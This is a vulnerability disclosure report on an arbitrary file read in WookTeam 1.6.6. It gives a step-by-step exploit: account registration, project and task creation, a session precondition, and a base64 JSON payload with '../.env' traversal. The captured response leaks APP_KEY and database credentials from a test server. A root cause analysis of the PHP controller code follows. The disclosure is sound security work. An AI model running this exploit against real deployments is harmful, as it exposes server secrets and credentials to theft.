# WookTeam 1.6.6 Arbitrary File Read Vulnerability Report

## Introduction to Vulnerabilities

The project task export endpoint `/api/project/task/export` in WookTeam (Laravel-based team collaboration tool) downloads an arbitrary file from the server when the `data` parameter is supplied with a crafted JSON payload. The `file` value inside the JSON is concatenated directly into `storage_path($file)` without any path normalization or directory boundary check, so directory traversal (`../`) escapes the `storage/` directory and `response()->download()` streams any file readable by the web server process.

## Affected Versions

- WookTeam `<= 1.6.6` (verified on `1.6.6`, `package.json`)

## Utilize conditions

1. Public registration is open Or have an account with any permissions

### Step 1 — Register an account

```
GET /api/users/login?type=reg&username=cve&userpass=cve123456
```

Response (JSON, `ret=1` means success; `token` is returned for later project operations):

![image-20260826103538094](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826103538094.7w7k86og1j.webp)

```json
{"ret":1,"msg":"success","data":{"token":"MTJAY3ZlQEV4NlNkTkAxNzg3NzExNzE2QFE0NUJNNw==","username":"cve","nickname":"cve"}}
```

### Step 2 — Create a project and read the project id

```
GET /api/project/add?token=<token>&title=FileRead_Test_6k61cxk5
GET /api/project/lists?act=manage&token=<token>
```

Response snippet — the newest project is listed first, `id` is the `projectid` used later:

![image-20260826103712009](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826103712009.4ubo6yne30.webp)

![image-20260826103741362](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826103741362.1zj0168hzc.webp)

```json
{"ret":1,"msg":"success","data":{"lists":[{"id":14,"title":"FileRead_Test_6k61cxk5","username":"cve", ...}]}}
```

`projectid = 14` (the attacker is the `username`/owner of this project).

### Step 3 — Create a task, then trigger the export to set the session guard

```
GET /api/project/task/add?token=<token>&projectid=14&labelid=<labelid>&title=fileread_task
GET /api/project/task/lists?token=<token>&projectid=14&export=1
```

The second request builds the export zip and stores `Session['task::export:username'] = "cve"` on the server, keyed to **our session cookie** (this is a required precondition of `task__export()`). Note: **all requests from Step 1 to Step 5 must carry the exact same session cookie** — the one issued at registration/login.

![image-20260826103940535](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826103940535.7ehijlnyzc.webp)

![image-20260826105004784](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826105004784.7lkqf1aefg.webp)

### Step 4 — Read the server-side `.env` via directory traversal

Payload JSON:

```json
{"projectid":14,"file":"../.env"}
base64：eyJwcm9qZWN0aWQiOjE0LCJmaWxlIjoiLi4vLmVudiJ9
```

`storage_path("../.env")` resolves to `<webroot>/storage/../.env` = `<webroot>/.env`.

**The exploit request MUST reuse the same session cookie** as Step 3 (the cookie jar / Cookie header from the request that set `task::export:username`). Without it the server-side session is empty and the request is rejected with `502 请求已过期，请重新导出！`:

```
GET /api/project/task/export?token=<token>&data=<url-encoded-base64(json)> HTTP/1.1
Host: 127.0.0.1:8000
Cookie: <same session cookie as Step 3>
```

HTTP response:

![image-20260826105056808](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826105056808.8dxlwrra0i.webp)

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8
Content-Disposition: attachment; filename=FileRead_Test_6k61cxk5.zip

APP_NAME=Wookteam
APP_ENV=local
APP_KEY=base64:AUmQcnGNFp6jwRWj/tsMHADOPjzut++yZpXTG2lLfbg=
APP_DEBUG=true
APP_URL=http://127.0.0.1:8000
...
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=wookteam
DB_USERNAME=root
DB_PASSWORD=123456
DB_PREFIX=pre_
...
```

The full `.env` — including the Laravel `APP_KEY` and the MySQL credentials — is streamed to the attacker.

## Root Cause Analysis 

### 1. Entry — `task__export()`

`app/Http/Controllers/Api/ProjectController.php:1402-1422`:

```php
public function task__export()
{
    $username = Session::get('task::export:username');
    if (empty($username)) {
        return Base::ajaxError("请求已过期，请重新导出！", [], 0, 502);
    }
    $array = Base::string2array(base64_decode(urldecode(Request::input('data'))));
    $projectid = intval($array['projectid']);
    $file = $array['file'];                                     // <-- user controlled, no validation
    if (empty($projectid)) {
        return Base::ajaxError("参数错误！", [], 0, 502);
    }
    if (empty($file) || !file_exists(storage_path($file))) {    // <-- traversal NOT normalized
        return Base::ajaxError("文件不存在！", [], 0, 502);
    }
    $checkRole = Project::role('project_role_export', $projectid, 0, $username);
    if (Base::isError($checkRole)) {
        return Base::ajaxError($checkRole['msg'], [], 0, 502);
    }
    return response()->download(storage_path($file), ($checkRole['data']['title'] ?: Base::time()) . '.zip');  // <-- arbitrary file download
}
```

![image-20260827091628186](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260827091628186.2rvviwq9w8.webp)

The vulnerability is the pair of lines:

- `ProjectController.php:1410` — `$file = $array['file'];` takes the attacker-supplied path verbatim;
- `ProjectController.php:1421` — `storage_path($file)` joins the traversal string to the storage base path with no `realpath()` normalization and no check that the resolved path still lives under `storage/`. PHP's `file_exists()` happily follows `../`, so any readable file becomes a valid "export" target.

### 2. The JSON parsing path

`app/Module/Base.php:272-290` — `string2array()`: a payload that does NOT start with `array` falls into the `json_decode($data, true)` branch, so the attacker supplies `{"projectid":12,"file":"../.env"}` as the decoded array:

```php
} else {
    if (strpos($data, '{\\') === 0) {
        $data = stripslashes($data);
    }
    $array = json_decode($data, true);
}
```

![image-20260827091708026](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260827091708026.13milq0a3v.webp)

### 3. Why the role check does not help

`app/Module/Project.php:159-179` — `Project::role()`: for the project owner the check returns success immediately:

```php
// 项目负责人最高权限
if ($project['username'] == $username) {
    unset($project['setting']);
    return Base::retSuccess('success', $project);
}
```

Since the attacker creates the project himself, `$project['username']` equals the attacker's username and the `project_role_export` check passes — no admin rights or permission points are needed.

### 4. Session guard — the only gate

`ProjectController.php:1368` (in `task__lists()` when `export=1`):

```php
Session::put('task::export:username', $user['username']);
```

This is a trivially satisfiable precondition: call `task/lists?export=1` once in the same session.
